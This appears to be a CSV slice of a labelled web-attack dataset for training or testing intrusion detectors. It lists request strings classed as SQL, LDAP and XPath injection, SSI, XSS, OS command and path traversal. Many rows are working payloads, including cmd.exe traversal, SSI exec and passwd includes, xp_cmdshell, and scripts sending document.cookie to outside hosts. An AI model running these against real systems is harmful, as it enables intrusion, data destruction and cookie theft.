,id,class,vector
4633,4633,OsCommanding,..%%35c../winnt/system32/cmd.exe?
4634,4634,SSI,/khmet5ShheeybuoHh/H8wp-access_logT4OIhQAgOo@/arCirhLa354yN.cgi?uteiraDe=nyungauya&teoofi5oahAe=h9neiodcsgzaep&sndiaa=insertkand%24or96havingw0a&F9HW-hgEfL=gaeser9eabr&codda=354&dytum2nri8eah=%3C%21--+++++%23exec+++cmd%3D%22c%3A%5Cprogra%7E1%5Csm%5Ce9ddfep%5Czieitged.exe+++d%3A%5Csouwret%5Cwww.tinaen.org%5Cr2ae%5Cdatabase.mdb++%2Fx+exporttofoxpro%22--%3E&1U9=45872433&QIMAA7Kxv@h=719917&atstnb=%2BsCy4&snuhugoilaeml=5581703&SE66hNVM=eavarq&brrsleii=3528127&JW5c=pr&esn=xG1C
4635,4635,LdapInjection,/rlfhisran5/inw9/Xol/e1huHye.shtml?hlIym4dncro=%3DkRheac2oe%28i&_perlpositionF5perlwgetcTnode=hwrer8n&aairrseriuw=mtm+an0tdropdhruu&s1neaEEotfoala=5xaLL&4spihsio=xHc2Lvcrr&aobennatae32o=%29++%28++%7C%28displayName%3Dhad*%29+%28name%3D++++had*+++%29%28+mail%3Dhad*++++%29
4636,4636,OsCommanding,/pSCIuqI3s7ez/aapml.css?eaawlotp=92.190.160.11+%7Cdir&itofto8atSErit=dee4imrdeiasc6la4&oSWNvbinSeQV7d=1664666&eou26cnoipme=6&whereK5E5FLSU=5caE-j1_S&exJsephd5uo=zej2x8ieRnhNo&hdSeydremlnnzoi=oZ8SVs&b0udiL=ca&rhnc9=xtU.-HUTR&mtci8bndraDiaoh=iOk&m2dz5eebnNnrds=ostyle%7C+&6DAi0a=saaIgbbiOvtUneinli&o12saettsseij=ratdepo&Y0gQopenqWO=tiahnxcvee&lsuiie8Kf=ngagnfNsratsrn
4637,4637,SqlInjection,hljhlndireSexs=' ); delete from    users;  commit;  dummy(   '
4638,4638,LdapInjection,/gItduCtmiecshb2/cSfaalWy.kBMeVz3Fi/cesoltehmsnthlQwe/5PV7N2BO/aAyt3hidE/fepeoeetie/rJM4Rp2KlC/ttneoDmouindsaqeof.asmx?fnihyDnm=%29+++%28+%7C++%28el%3Dzt1e0*%29
4639,4639,LdapInjection,/NCcatLdFe8ftmailY/hlowitzkesdcetr/m4XFYMW/idiegiideias/DzN.cgi?blau7ww=7901%29%28%26%28objectClass%3Dewtn%29%28%7C%28sn+++%3D++++9ot4%29%28cn%3Diot+J*%29%29&xE=1398&sg=AsebreYeinRca&auIo=MSe14
4640,4640,XPathInjection,/d-I/TqdhtIoa/QyOAB201H@Ns/b2emNee/sezesR3i/eeclueo4rehte/asbnneoapzCbErs/ip8t9OotTadesloChda/gCDuUwVkRor.jpg?OlS93alaezdn=dAtcoe&heg=010&eospeasobaih=65158&XMorsQJSp4=textermByspiuee&ertellt=828&wSedn=500&2flsK67C=l8
4641,4641,PathTransversal,/raddWrnm4rlexnBx/8j/enRJlCf7hSl1gq4A.mspx?RHCc9HoG=slinkd&hedOaocIattga6=tgroup+bygl2oyirS&rnngEUuIetdss=9983702&lIia4Lennp=b&einAsalt=%29ym&bu=88
4642,4642,OsCommanding,/ianubieqirfc95bi4/Ce0AQFIPLLUEp.tiff?
4643,4643,PathTransversal,/havings.sUshutdownU1wj9NE/gx5tsagrS19s6zeZe0r/bl1@sWphpZTOscriptHLA/egKryW.css?aihistOeIM8=52430&scriptAaccess_logK4bnph-pJd=udrope&rottnpihfwdii=5709&dndtwer1=rEarxterm&phiuFhhlbnset=9388235699&relXelni=%2Fetc%2Fpasswd&aL=384
4644,4644,SSI,/has6pafiddtbWleso/xPxHz.sh?MFQrlinkArmt-zj=sN9SuA2&eEunionnuY2=060280972&ienduem=processing-instruction6wetteo5sI+it-&iwsid=%3C%21--+++++%23include++++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22--%3E&z7lGK=1257246
4645,4645,XPathInjection,/IOxWempmYp8/hLssf5nawdo/Ilikeb/kM.A4/oYsv4vJ_xNkpk.jpeg?lformlocationlogT70aiKYP.=cdhun&io4tGfDaAOidsf=9t&GyT0u8perl=90&07eoeamurt=6513&farea=itVMb3MZ9iG&FJxB=oetnt%27++++or++++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28+++i++++%2B++++j++++%2B++k+%2B+l+%2B+1%29%5D+++++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or++++%27eenTL%27++%3D+%27++++iciqanis%27+or&lXqc=430&5et7sj=72&Yn0Ra=fnode&elwjxmas7EH7f=hmnwinntp%3E%3BEH%26c+rn&zetnSshisn9int=o
4646,4646,SSI,"oT9=265703&rtrseCEp=nan]allp%Jeeo&eRe3t=5&hlioSt6E7nnflg=49616&aq6aqrs28awwah=<!-- #include   virtual=""/var/log/httpd/access.log""  -->&tr=rts&luidyneD7oVeo=mr1CgukE&Ena1f=iAidlf2um&uJgeocesos=2042856&V2htpassCVhtpassp4-vss=1alaihtoewl&cqAj0i6YC0tconc=orheLnesoewt6tesfs&i1Scte5ms=ezsoisBo7n&48ohegj=73"
4647,4647,LdapInjection,/simwrdtItaaaostn0u/2aMwLa0RxWvA3zd_/khcsOw6VIWe/tji0tI-EmMF1l9wrkyiT.png?tmjnnnieesz=91228455&xlueuh7byNm=evrAeloW&4FCBL_Hhi-a@=eh&li8t=dYY-N3Q&60jtA-QkjJ@=7io%5C&artUhsm=%29+%28++%7C+++%28pbrod%3Dye*%29&Oicvtaag=53962362&ddeoiw0nTtt9pal=vIa3B-3wl%40
4648,4648,XSS,/otf1ehphoeearr/tLx6s30aiofheax/ci2kUh/8We9/wq91eM/tsOyro1rci1ngjanisi/riHDsrmiwcw.html?qs-4X3XPX0=67903&tDI=rr_S&gd5iiAxoie69vud=%3Cimg++dynsrc++%3D+++%22+++javascript%3A+%5Bdocument.location.replace+++%28%27http%3A%2F%2Fwww.nengelar.com%2Fcgi-bin%2Fin.cgi%27%2Bdocument.cookie%29%3B%5D+++%22+++%3E
4649,4649,LdapInjection,hsmgeyeonmva4m= Ietre&R_K94XFr=aallta8&h5dftktchiRy=)( | (aet=palt*)&eoaeEfxx0rrne=ntrnvtaplgthel&iE4cmdq=documentze&bhIMirm=55&l8mc=iygradeFY~s&aodcy=11271&lrS5gntyior4=h(rnto5yt 0ae&eusimvsnrh=8
4650,4650,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
4651,4651,XPathInjection,/eheolss/Nf7Zlocation8_Wis/cDG/bJwDs6UH8r0les3/wl7usuef89spshu/s5_ZaHS1IbANb/2qcQmcnhHNZLxNqh.jpg?GkW3=a_43x&gnhnna8s=rEagtzhhrujeteg6&utue=2364&@Q.ICxterm1unionZopenAV=6udgdobcnenb7twshi&areaggzDlz=sA8&sAA9sjakvrbca=asaO%2Fsefz%2Fyar%2Fchild%3A%3Anode%28%29%5B++++position%28%29%3D405%5D+%7C++enl%2Ffoegh%2Ft%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D4%5D+++++or++%27si%27%3D+++%27&ort=dLGe&ckdutHdlaR2=19&4hGgEtuhrI=09750552&e0etsEmaot=sns
4652,4652,SSI,/fw/Ncj-1pBROp/pdPw386tido6ulp/etr.php4?7ertftriczno=f%7Cdhi&HiIKTOUaDRIG=eQnezhr&l4XoZB=choloc+t&horiAmdbktreo=gmeerT%27formrms&PpESug1-@=%3C%21--+++%23include+++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22++--%3E
4653,4653,LdapInjection,nbgoto=1se&Niudti=Dolbin&4JYlogf5=ImfeuayhrsteNin&uqe1=emaGe&rtc=8628&Mlhamweei=ie)(&(objectClass   =  runa*)&dTrltUT4GE=6shneBotfe4lNosi1h&3i4ltnNhihpwR3=style7ozgbin<dt&diibehsu=reo&tse6wn0c=ihiToarnc&V67bgsoundE=556521&kRhNsseotc=440
4654,4654,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
4655,4655,XSS,/l4QDU/eaGNyx_ACJ54QlOI4jv_/eA.gif?tjgtetgndlYtenA=%3Cimg+++++src++%3D++++%22++++javascript%3A++++%5Balert++++%28%27ro0gd%27%29%3B%5D++++%22+%3E&PmO6ypB=728748&_P75cp3whereAlS=7%2Ba&3aelor=34771&tswo=529&@-Bservices9ek=rhie%25o
4656,4656,SqlInjection,/ovFdzUF_pB./child.Ainxp_g-YIsamMd./MRJvy/zhI/fw3maIWv5/nxtOmDgbJQl9OQlfV/jUgGWOPCNwDfDPj.html?q1j-Sstyle=285&eOa=nrkhs&nknwrinirstdir=1989480906&4AY3Euk=%3B++select+++++*+++++from+++++OPENROWSET%28++%27SQLoledb%27%2C%27uid%3Dwec0ocooo%3Bpwd%3DO5netn%3BNetwork%3DDBMSSOCN%3BAddress%3D141.222.51.87%2C68127%3B%27%2C%27select++++*++from++hk%27++%29&yivi1osd=in%3E+u%5D&oiV=369806&dn9aO=styleat%2F1&erksoqeU9h=suoEtlqibyfanw&iooouucdnoesN=aa%40ta&PqYaVoJzCW=tNXK.f5&serhc=3w%5D++muoscsbN+rsg
4657,4657,SSI,/qpDM/Q8idPNtzWU.php?hrgonsihot=%3C%21--+%23exec++++cmd%3D%22c%3A%5Cprogra%7E1%5CHe%5Cloaqelaey%5Ctjr2O.exe+++++d%3A%5Cqal%5Cwww.nsri.org%5Ctq%5Cdatabase.mdb++++%2Fx++++exporttofoxpro%22--%3E
4658,4658,SqlInjection,/hhMdRTM_RGgDEluTkDW/vavLLkDit/vb@./t6FXH-Sj5-/zE80KxY4Naf/nenqwsxl6eVwmn/n@HizamU.cgi?hbmO=n&wn=%5Da&8AVddocument=8WQwH&eiIarpcoo=4MG2OXy-dHx&BrcpGa=97aFNRd&ajq9afnzi=%27+++%29+++++UNION+++++ALL++++SELECT+++++%27vnadaae5%27%2C384%2C9%2C%270hbL%27%2C9+FROM++eishdeeh++++WHERE+%28+++%27%27++%3D%27&heesnirriEra=n&soEtl=slx7p%40u9-mWs&nbtstTeWog=imgqrs
4659,4659,XPathInjection,/wlB8He/sl-fXkcEKQMxF5YfQ/im3sH5soWbzlcxuAit/9ixIDhMpo/EiEcnftsoatmhboc/0a4Dy9/wojVcqysn/baiuelUkpjLsnnT.asp?7evalletmp6=d&sac0=9311&r7Iuntpdrrlwn7h=%29&ii7=8i&cdgiic6k4tM=tcoddin&IwusXVoUX=92395752&tgnhbdoony5a=mochazt0&OsHk0=iE%27++or+++++rs%2Fdese%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D0%5D+++++or++++%27cnasdn%27+++%3D+%27&wv=s_Jv&eudfWinqgNsd=0684&czyoli=useedr+
4660,4660,SqlInjection,/tOl2eS_k9/et7/lnGWqi/nncuePzerJta9pi/hBAmjVAm5jx/3xMVzU.m54T11FJ1yCC/phpO0wR10/yxExlWKX0OpositionzhzO/kTq.bin?bxz3c=En+egruinnne&Hy7dwewiu=ehae%3C&ICi1Oo0YBlib2=bz2l&dnAbr=%3B++insert+++into+++++OPENROWSET%28%27SQLoledb%27%2C%27uid%3Dk8itet%3Bpwd%3Dmdzce9d%3BNetwork%3DDBMSSOCN%3BAddress%3D19.161.156.0%2C1433%3B%27%2C%27select+++*+from+++++_sysdatabases%27%29%3B+select+++++*+++from++++LinkedOrRemoteSrv1.master.dbo.sysdatabases&iynb=h%28window.opennz&HYvIQPOYl=0363&eajbia=lniebmru%3Eya2w&sbfsgaEsa=c%5C%5DsvR+er%40hrRe8Nopen2t+&Ns4iI=xp_aarl%3A&zm=b.FCw5LRMD&zolnrc=4%7Cth&Oatanrd=139&atit2hod6msp=nKhAMain9&wbodyh2processing-instructionLkkO=tsp0bNdlmi
4661,4661,SqlInjection,/ErtfmPSnw6/mE852/N4itIrdoki.cfm?7dhuutte7=oi3th%29%25ufiea%3Cft%3F&htPr=seiofgeTfc&I4rac3lTimggsF=%28%3Aanb%7ENrgrlIa%7E&ibslsitreo=8310&eN9Atri=select++totarogi+from++ALL_USERS&tteioe3daE=b1oe
4662,4662,XPathInjection,/hrRV/Yhle.netcatoTfx8/h0eMa/erarosxrariritF/oOr6t4qKIkeprE5t/wUI6iE@iJ4KK/ryBXBlsYDRT/ZQGcd3qetcls/5oijeimiiddoaouec/eifVa/k9cnSfcn0ragsa9dr/E@xlinkKZd4WepOmetae.mspx?m4sEcoqs=%2FVscriptrgroup+by&MEt.WxVARVEf=O%29a%5BhYeev%40scriptt&icen8ifihhal=tmeagar%27++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or++%27ROvn3%27++++%3D%27&vrdtassceUdohlr=snrniedm5o
4663,4663,XSS,/iGmpOTT4aQE@-gFEc/pe7sl/phyt70aeiCenonxoLLce/sQveM7376u/degtemui1e/ootrntgsuIelS/qXM9npSOCM/nategfuee/cmlo3GM/0treLlh9dlen.asmx?y5RQIM=%3Cdiv+++style%3D++%22++width%3A+++++expression%28%5Bwindow.open%28%27http%3A%2F%2F234.111.228.145%2Fis.cgi%27%2Bdocument.cookie%29%3B%5D%29%3B+%22+%3E&inHnhM7Eleghei=765&Gg=157
4664,4664,XPathInjection,/Etmp41Lfromu/a8@U0-9soL@U/vc-rIHAANfO/on.php4?shutdown3D3bA=+maexecfart1&6jhvq=ocsdoinl%27++++or++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or+++%27xIrUro%27%3D++++%27&ahinbzbEatuv=598
4665,4665,OsCommanding,/rzhliadagoe0/dimdeeHhgcii5ent/gxmerayt/az8zZvisEULAo8O.Hxf/goovahEaElowpthS1ch/r6dv3Ioattehotss/8xMquFB2Yl5.exe?LvarQvyTNVs1KU=aHea&0Cj1etcC=5141853&otTeupaocrl=rqk&uUo2DV50from=jcezbp&TselectKRoFqH9Wb=5f%285Our&hwres=8cz+oaBctnpimgn&isal8keydioa1=8&sVue=%7C++dir+..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+%2C
4666,4666,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
4667,4667,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
4668,4668,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
4669,4669,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
4670,4670,XSS,/dQpZvhHxh_DE9GqPF/1fi2sse/SBBLCOE/ffEIsystembetweenW/6a0s/aqjIP7o/itv.css?a2wys=hse%288a%2Fyoir+bmt&ttsguts=hyttnwo&De6ILupdateWKDoO=tGruSiIQUp4&P5dni3d=%2BrgtsoeWrcp%27iersy&sucwbtrHm=-etgpdbtboeeeeohomeEdan&bKRveFZnT=%3Cimg+++src%3D+%22++livescript%3A%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.ra.com%2Fcgi-bin%2Fseicllsi.cgi%27%2Bdocument.cookie%29%3B%5D%22+%3E&Oogj=slnyh5mna9nebiuotx&sxq7biJar=a8aittocIsteYa&tg=di&gnwheiiae5oa2ue=NHeo&pMLLE=940116
4671,4671,SqlInjection,/edtow/fwRxAB9L3/nnotvemeaipoa7/lfN2Jf4-rl3FUu/p8XyeGtfM/qTrr_@dQWm-1.bin?se=exec++++xp_cmdshell++++%27bcp++%22select+*++++from+++++8gbi9N0%22++++queryout++pwdump.exe+++-c+++++-Craw+++++-Shackersip++-Usa+++++-Ph8ck3r%27&tTrhputehr=t+a&rcpqimgacnQYN_=0995&an=8427810&p7p6hTr0eh2=4785&ipertb=lhb1rn1t%3Ala
4672,4672,LdapInjection,/rrCaAjtSZ4H362V/Aoek9/ee7_/hn4LvH3/2jkq0dropXFZzpasswdGNYd/ak@k0131/zhbK5@1SRq/i9r1z/tIGeLY.bin?j0aoa9oreplaceftp-x=rbahirp5siheeypSh&UR5mE=3&65ekdal77tln=30%29%28%26%28objectClass%3Ddpd%29%28%7C%28sn++++%3D++aeg%29%28cn%3Djs+++J*%29%29&3niqafchrexdn=TeenirnuN&ae=4
4673,4673,SqlInjection,NcuhcnhodFxl=tUO9t&b2eHnmMcao='    ) UNION   ALL     SELECT   7665     FROM 5gdrPs2ziR    WHERE  ( ''=   '&8foysHgaanneuW=nn3lrcbnrmOid3&aiM2_TG=s(processing-instructionmo&g9nyseiotly=tznL )s
4674,4674,XPathInjection,/if/barhamte2heCn/acAtEeeTd0afasC/r8/hGbdOUHwfucntB2s/ogSveOf8dVs/F8ioiO3CyllugO9nce/maqxb@Fv6aiV2OPxZzpf/ld.htm?qahuti=n5+zsi&WwCt=7001761&QUi1L9d=235679&ej=90867+++++or++1%3C+++++ns6em6%2FsCv%2Fh%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D6%5D+++++or++++67%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&xWrBs_sN=42%26a
4675,4675,XPathInjection,6igKave=7-o@PH33&4e1h8ymEo=ks&Mlwridh8t=da' or    deede2/hd/child::node()[processing-instruction()=498]     or 'sschmj'   =   '&B9SA@mQn8D=91250&Stodxhe=9&imeineyrttahac= null &C8TdHxniaeeovta=neba2ryatBccuisgr
4676,4676,LdapInjection,/to7sejeoh5m/dpMQXVhEUMc/4GpFoRxna88gjYj/icREcyCFJ-EBXzay9/nbP/s2D1r74N-gf-3Z/xsv6YxigLb/LSMe6@documentL/urM.cgi?KB.fO6L=40&aoamseueg4ye=qOP4-%40Do_&eetj=16&kmOko=c&YesfareErOd=es%5C%5Dupg%5Cca+Ge%25boehttps&8iayderLwhehl=replacenevaln&lswNdrEeC=hq3i4+mon&iepgeCkooAc=632wi&e5tm=%29+++%28++++%7C++++%28displayName%3Dhad*%29+%28name++%3D+had*+++%29%28++mail%3Dhad*+++%29&ooelhj=5570354
4677,4677,XPathInjection,/eAeOTh6ndioedasd/PaR8S/y1Sou@-oSllUfv5LC5wZ/vC/-W-execGIC/NUVV6_x6eUCZ-/hRZyYc-4UXJ@MnaRoZj/0tFqP6JZCZKDkj/au0QWqwX4os.LzIhLtVC/tZ4caZ21jBdite7g/eul3Lq@_0.htm?m1LtfngTy=st4yo%5DnisOsftp+tk&wo=+lEThdocumenth&wnaihpatfige3se=5Esa4weo&ebh=+s1eNo7yis5atb%2F%26i7&ettrus=wmz+xmlh9a%5Ds9-+nphp&qstdinFGS6=56&talesp=icftoviG&odc5Khrhoo=3&PoP1formS4KxZftptmp=tlaefnbia8&te7=hgvEengN+5n%3FfselectkD&uarpao3=151906996&a5utnwe=izYt&LEJST44ypFzO=obsoss5
4678,4678,SSI,/eh/rLGSYuw9IfTUq0Lv.-/iosZKSrj@zKCD4/Ys9iqn6ehUrA4Swnaz/tRZGC/Uniesa/arfCf/ofei2gt6as5initaecsj.tiff?dtdadfesnUq=wlsc%3Cl6ish&eix8tde=hcwMO3x7Wm.r&srgejsntd3iem=hclike%3Dh&otm8n=0413&iqg=60915&txyincisvHhH=enaae&LINYzIVDWsS4=%3C%21--++++%23odbc++statement+%3D+++%22select++++eno%2C++++Tnin0%2C++++Ssrcm5r++from++++t3lsi7n+++++order++by+++7%2C+598%2C+++++0%22+--%3E&Vwp-T-Bscmdh=ub+aOiian&lq2sEtmssger=wykhexmlico&pn5icctus7Uqiok=we+lu+oxml&otaka3OmybntT5=ahled2dcdocumentma&PobjectexecT9Jeval4GN3access_log=Rli0pi0Dlsajemta&jUs2toeOda=jrAPe&ifEh8Trt=6i%3F
4679,4679,XSS,/iAWUsF.XjXBPt3/4Gpa.pfU/oagihocchobeqhU/o6.wivkbS87ESEvb.jsp?2niTwltoad=3399477995&nm=eieservicese&tAtd=r12idlz%2BEa5%3Ctbqaesea&ehx=%40t&er=cOCegEM.&Genr2wdIeEDhsf=%3Cscript+%3Ealert++%28+%22+++eue5rsa3me8tsocn.weseot%22%29%3C%2Fscript%3E
4680,4680,XPathInjection,/sVjflwN4MqpBvJ/r2NqPX3QbONDR/of19dpwcCx55/nht/nOyt9/r.w-tHV58BlL_/a1_HbUp0paQ2i/Pi_ySperlnph-V2jGD/NIxp_L7RYG5q_wbetween/hOG30w.OZaV2f.gif?HTtthhu1uhsn3Il=s2u%27+++or+++++anU%2Ff%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D8%5D++or++%27nNu0qidm%27+%3D++%27&rdcnsd=544034409&Dra2i=221474&oemhmarIttatuo=waer4oIhrahxjo
4681,4681,OsCommanding,/ssi/envout.bat?|dir%20..............1
4682,4682,LdapInjection,/nFOpA1TLozpoN/sq0L/v5SI/rcya4Sy1R1liCK7lmPN/r4/uT32_i0FHJ.gif?2nF6sDom=264519&md9esMee4trv=03127877&sPJnAIhttpmailE=921864650&dnXa3walhdazkhw=8991702&aFVinputcwseHW=drecftOcd&2Otsitenre=2939762&tmrhejetioh=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29
4683,4683,SSI,/pFm-DA3J/Htetews5aKh22h/sRdK_TJWHshC27qLO/cHwiKLi_zBEo-0.asmx?erttrOrs4fm=4330501&_RFhXmL3sami=gtnO&bifmturwhs=%3C%21--+++++%23include+++virtual%3D%22%2Fvar%2Flog%2Fhttpd%2Faccess.log%22+++++--%3E&sn2hoehLtdL=Ehlsmnt0ndiognnoR&openRyuYJ7=dWll%2Byd+
4684,4684,XPathInjection,/ljhUvWhyc/Drve8sgaesmtsx3se/oNKyFa8j1PnknB.jsp?eA1yelo=sAlezl&wU_Hjdcmd92QD=83++or++1%3C++ecteam%2Fee3%2Fgaertc%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D9%5D+or++860%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
4685,4685,PathTransversal,/tPNllpfY7teWZgz8/anNanrganer/boot.iniXQvc@4aQ%uB-H/ry/aknweoyp39ae/8v..Pllywhere0/ere2s5twnw6enzehnZE/telnetLtmp./maN0ToNltnsrdbaaaY/wHo5btSti3S2L2nWd8iS/uT4Ot_5MGF8RB0Clz.bin?7b3@-tperl=..%2F..%2F..%2FWINNT%2Fautoexec.bat&aqOtnete=euhavingdu%2Btael4httpsmocha&scb=eI.jQe7IXsru&plvyucneeddbnt=w13u3.&ut5heoAgMDfr=t7tmpnc+oJs&oi=bOeclh%7Evheye&te=yalinkmteOe+whereey&zhnbnAe6h=1104&4document_1o=nhttpt3ese6%24d&atnysnna2=8am
4686,4686,OsCommanding,"rhTenv=';     EXEC     master..sp_makewebtask    ""\\143.80.83.45\er43grta\fneuLp1a.jpg"",    ""SELECT   *    FROM INFORMATION_SCHEMA.TABLES""&2U5Kwindow.openhjhjb=opeeaboflm1o&qUF2=httpts \&ttsfpesgmlTwes=>shb&oAhouE30sesp=749"
4687,4687,SSI,/0Il/sy2rXN@lQr6C/yeun3ielEoytae/doshk/2tmpHnI3ftpCv2/uZ20cDZru.css?YkfCexec5itXGDG=ydkzoiu4ai&aeinqtDNTMhiT=%3C%21--++%23include+virtual%3D%22%2Fetc%2Fpasswd%22+--%3E&tnDee7=st+6a%29wzceno%26jlnr&ntttHslp4hrnoas=155920268
4688,4688,XSS,/fkF3GH8GTHi/3laf8aa/NJU.css?nQlaunyainur=w5&di=ersllasO%3Eaes&9u4iXti=gM-%28location%5B&nlsceefj=yrif&ldAhljnfe=30096&DscriptY8hmqwbV=eperlet2haao95&scrqsebonUhtne=%3Cxml+++src++%3D+++%22++javascript%3A+%5Bwindow.open%28%27http%3A%2F%2F193.106.114.49%2Felal.dll%27%2Bdocument.cookie%29%3B%5D%22++++%3E&iaoss1Adr=56954104&fnzssne=tiadmins&6eK@9ZFBj=nUdge0oenemsiya&oauoS=l%40j31nIV&teehi5dieN=i6t&2o8vc2sic=eetaottcleifnde&ntqi=accept+idenMoeto8logEoha&ndnwe=g+xtermo
4689,4689,SqlInjection,/csm9see3gbattloynih3/0tikQA5b8m/dgut9on1ttq/snc6P085K_MbS/qrW95szID9/rfzRVRx82lV4n2/aHWwIk/s49awu9nv@/0varRHsZUMVArxH.asmx?eaeoanen9IuvtlA=64240073&aHSNado=updateih8%3Cphmae&coebrd=%27+++%29+UNION+++++ALL++++SELECT+rcnn++++%2C+talmTavj++%2C+++++aevtit+FROM+ccaah+++WHERE+7d+NOT++++IN+++%28++++%27eiljnrnp%27++++%29++AND+++mA+++NOT+++IN+++++%28++++%27cyeThausy%27++++%29+++AND++%27%27%3D%27&ietalitmNN=iSerwsae
4690,4690,LdapInjection,/ls/eu7zz@1/vmldSihot/uI.bYyfKH1rz6EBPSGv/eWlsxCyYl9LE.mspx?oUt6=oidrnmbevnekoh6&ZK8GQ58UUva=%3C&iszEdhriAonml=%29%28+++%7C+%28nae%3Dzds*%29&revtn=+y&7havinghBunionbO=ahg
4691,4691,XSS,gFsoHet=e1gl&nkrucacma=&<script   >[alert ('zh5taeSiow');]</script>&srsEt=tstg&JUG0KUD9=eg&raAiduespotdIen=g1z2oruooa9n
4692,4692,SqlInjection,/rqtsbtoE/tnpssehnytLd/iMjtLv2s/VtYz@x5eR4Dj3du/NTC4djz.html?GSzU6aV-FMty=haIgO5pHrtLh&sgUjAeat=2033792&n53hsTe8feiupEs=rmitIc8genG&gtttArecs8=OR+++++%27daW1em%27++LIKE+%27Sim%25%27&yfgos=a%40
4693,4693,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
4694,4694,LdapInjection,Rro16eutseurahe=7342639641&eeosq=62&o9Xetceqm=9sgrierdF&eosodcwtoi=dnMUcseelktrw&eQexjaCNulh7btn=t8meuouy3&ejtzyLonHaelaj=8426002&hnoHp=09067155&dtfkswnrdallEty=48&iet3lbtshfnah=orausock_streamraetcrdda&szorcmn=hr
4695,4695,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
4696,4696,PathTransversal,.////////////////////////?
4697,4697,XSS,/naGafstotnl24mtdg/v.fa/okV/e_Cn-/Likceaet1c/prduM/xconwtezaDmkgk/au8thWePHs9ntntzwe3.tiff?Ams7AW=saatUiIoIro9xlrec&n8UWtT=%3Biiol&aoytLtmY6ssA=%3Cxml+id++++%3D+%22+++X+%22%3E%3Ca%3E%3Cb+%3E%26lt%3Bscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F115.205.235.145%2Filtoas.bin%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++%3E%3B%3C%2Fb+++%3E%3C%2Fa+++%3E%3C%2Fxml%3E
4698,4698,XPathInjection,/eSV_F5u-/mxt2oohs.asp?BJ0fKIRhome=ctds7t%3Cgioaanea%40&execa0i5accept=window.openid%5DeE0logRi&essh=hs23rtelisttHdm&cnoatInShwh=4300&seestlteam=UOlreds8oysdcu&fc=4&9NrtofehdtbsrIl=lwnmgs&OxyBdg8tvemochagroup
4699,4699,SqlInjection,/o2rcptaA.aFh410U/esaonOnve/2wVPIR/twbVSW6kunc5cVtQ.exe?STsjaeenHtape=group+bytE&ritd=3php%2FNmxljumooo&cdaegtYemoaOnVr=rn9hrc%5Dth&if=%27%3B+++++EXEC+++master.dbo.sp_makewebtask++++%27c%3A%5Cinetpub%5Cwwwroot%5Ctuhne.html%27%2C++%27SELECT++ilAtne++FROM+++++ntouk+++WHERE++xtype%3D%27%27U%27%27%27&tlnIectiN1=191&or=nne%3AhccsztrlO&prdpn=7596
